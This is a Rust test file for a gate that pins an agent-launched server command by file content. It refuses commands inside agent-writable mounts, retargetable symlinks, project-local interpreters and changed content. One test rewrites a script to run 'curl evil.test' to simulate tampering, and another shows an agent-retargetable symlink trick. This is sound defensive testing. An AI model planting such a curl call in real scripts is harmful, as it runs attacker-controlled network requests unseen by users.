//! The command pin (ADR-047): content, not paths; nothing the agent can
//! write; a change refuses the start.

use super::*;
use std::os::unix::fs::{PermissionsExt, symlink};

struct Fx {
    _dir: tempfile::TempDir,
    root: PathBuf,
    /// The agent's project: a writable mount of its session.
    repo: PathBuf,
    /// Outside every writable mount.
    tools: PathBuf,
    /// The server's fresh working directory.
    cwd: PathBuf,
}

fn fx() -> Fx {
    let dir = tempfile::tempdir().unwrap();
    let root = dir.path().canonicalize().unwrap();
    let (repo, tools, cwd) = (root.join("repo"), root.join("tools"), root.join("cwd"));
    for d in [&repo, &tools, &cwd] {
        std::fs::create_dir(d).unwrap();
    }
    let exe = tools.join("server");
    std::fs::write(&exe, "#!/bin/sh\nexec true\n").unwrap();
    std::fs::set_permissions(&exe, std::fs::Permissions::from_mode(0o755)).unwrap();
    std::fs::write(tools.join("srv.py"), "print('tools')\n").unwrap();
    Fx { _dir: dir, root, repo, tools, cwd }
}

impl Fx {
    fn writable(&self) -> impl Fn(&Path) -> bool + '_ {
        move |p: &Path| p.starts_with(&self.repo)
    }

    fn pin(&self, argv: &[&str]) -> Result<Value, Refusal> {
        let argv: Vec<String> = argv.iter().map(|s| s.to_string()).collect();
        pin(&argv, &self.cwd, &self.writable())
    }

    fn path(&self, p: &Path) -> String {
        p.display().to_string()
    }
}

#[test]
fn the_executable_its_interpreter_and_file_arguments_are_pinned_by_content() {
    let f = fx();
    let (exe, srv) = (f.path(&f.tools.join("server")), f.path(&f.tools.join("srv.py")));
    let flag = format!("--config={srv}");
    let p = f.pin(&[&exe, &srv, "-y", "@scope/pkg", "--port", "8080", &flag, "https://api.test/x"]).unwrap();
    let files = p["files"].as_object().unwrap();
    let mut names: Vec<&str> = files.keys().map(String::as_str).collect();
    names.sort();
    assert_eq!(names, vec!["/bin/sh", exe.as_str(), srv.as_str()], "{p}");
    assert!(files.values().all(|h| h.as_str().is_some_and(|h| h.starts_with("sha256:") && h.len() == 71)));
    assert_eq!(p["argv"][2], "-y", "the argv itself is pinned");

    // Same content, same pin; any byte changes it.
    assert_eq!(f.pin(&[&exe, &srv, "-y", "@scope/pkg", "--port", "8080", &flag, "https://api.test/x"]).unwrap(), p);
    std::fs::write(f.tools.join("srv.py"), "print('tools'); import os; os.system('curl evil.test')\n").unwrap();
    let changed = f.pin(&[&exe, &srv, "-y", "@scope/pkg", "--port", "8080", &flag, "https://api.test/x"]).unwrap();
    assert_ne!(changed["files"][&srv], p["files"][&srv]);
    assert_eq!(changed["files"][&exe], p["files"][&exe]);
}

#[test]
fn relative_arguments_resolve_against_the_working_directory() {
    let f = fx();
    std::fs::write(f.root.join("shared.json"), "{}").unwrap();
    let exe = f.path(&f.tools.join("server"));
    let p = f.pin(&[&exe, "../shared.json", "missing.json"]).unwrap();
    assert!(p["files"].get("../shared.json").is_some(), "{p}");
    assert!(p["files"].get("missing.json").is_none(), "a path that does not exist is not hashed");
}

#[test]
fn a_command_inside_a_writable_mount_is_refused() {
    let f = fx();
    let exe = f.path(&f.tools.join("server"));
    std::fs::write(f.repo.join("srv.py"), "print('agent-writable')\n").unwrap();
    let in_repo = f.path(&f.repo.join("srv.py"));
    let not_yet = f.path(&f.repo.join("later.py"));
    let dir_arg = f.path(&f.repo);
    std::fs::copy(f.tools.join("server"), f.repo.join("server")).unwrap();
    let exe_in_repo = f.path(&f.repo.join("server"));
    let flag = format!("--script={in_repo}");
    for argv in [
        vec![exe.as_str(), in_repo.as_str()],
        vec![exe.as_str(), not_yet.as_str()],
        vec![exe.as_str(), "--directory", dir_arg.as_str()],
        vec![exe.as_str(), flag.as_str()],
        vec![exe_in_repo.as_str()],
    ] {
        match f.pin(&argv) {
            Err(Refusal::Writable(m)) => assert!(m.contains("writable mount"), "{m}"),
            other => panic!("{argv:?}: {other:?}"),
        }
    }
}

#[test]
fn a_symbolic_link_the_agent_can_retarget_is_refused() {
    let f = fx();
    let exe = f.path(&f.tools.join("server"));
    // A link in the project to a file outside it, named through a link
    // outside the project: the agent can retarget the middle hop.
    symlink(f.tools.join("srv.py"), f.repo.join("hop")).unwrap();
    symlink(f.repo.join("hop"), f.tools.join("srv-link")).unwrap();
    let via = f.path(&f.tools.join("srv-link"));
    assert!(matches!(f.pin(&[&exe, &via]), Err(Refusal::Writable(_))));
    // A link outside every mount to a file outside every mount is fine,
    // and pinned by the content it points at.
    symlink(f.tools.join("srv.py"), f.tools.join("plain-link")).unwrap();
    let plain = f.path(&f.tools.join("plain-link"));
    let srv = f.path(&f.tools.join("srv.py"));
    let p = f.pin(&[&exe, &plain, &srv]).unwrap();
    assert_eq!(p["files"][&plain], p["files"][&srv]);
    // A shebang naming an interpreter in the project is refused too.
    std::fs::write(f.tools.join("script"), format!("#!{}/python -u\n", f.repo.display())).unwrap();
    let script = f.path(&f.tools.join("script"));
    assert!(matches!(f.pin(&[&script]), Err(Refusal::Writable(_))));
}

#[test]
fn an_executable_that_cannot_be_pinned_refuses_the_start() {
    let f = fx();
    let missing = f.path(&f.tools.join("nope"));
    let dir = f.path(&f.tools);
    for argv in [vec![missing.as_str()], vec![dir.as_str()], vec!["relative/server"]] {
        assert!(matches!(f.pin(&argv), Err(Refusal::Unpinnable(_))), "{argv:?}");
    }
}

#[test]
fn the_gate_refuses_a_command_that_differs_from_the_approved_one() {
    let f = fx();
    let argv: Vec<String> = vec![f.path(&f.tools.join("server")), f.path(&f.tools.join("srv.py"))];
    let fs = CompiledFsPolicy { writable: vec![f.repo.clone()], ..Default::default() };
    let open = Gate { agent_fs: Arc::new(fs.clone()), approved: None };
    let approved = open.check(&argv, &f.cwd).expect("an unapproved server may start (to be seen)");
    let gate = Gate { agent_fs: Arc::new(fs), approved: Some(approved.clone()) };
    assert_eq!(gate.check(&argv, &f.cwd), Ok(approved.clone()), "the approved content starts");
    // The agent (or anyone) rewrites the script: the start is refused.
    std::fs::write(f.tools.join("srv.py"), "print('rewritten')\n").unwrap();
    match gate.check(&argv, &f.cwd) {
        Err(Refusal::Changed(now)) => {
            let (a, n) = (
                mcpguard::manifest::build(approved, Value::Null, vec![]).unwrap(),
                mcpguard::manifest::build(now, Value::Null, vec![]).unwrap(),
            );
            let srv = f.path(&f.tools.join("srv.py"));
            assert_eq!(mcpguard::manifest::changes(&a, &n), vec![format!("~ command file {srv}: content changed")]);
        }
        other => panic!("{other:?}"),
    }
    // A writable path is refused even before any approval.
    let in_repo = vec![argv[0].clone(), f.path(&f.repo.join("x.py"))];
    assert!(matches!(open.check(&in_repo, &f.cwd), Err(Refusal::Writable(_))));
}
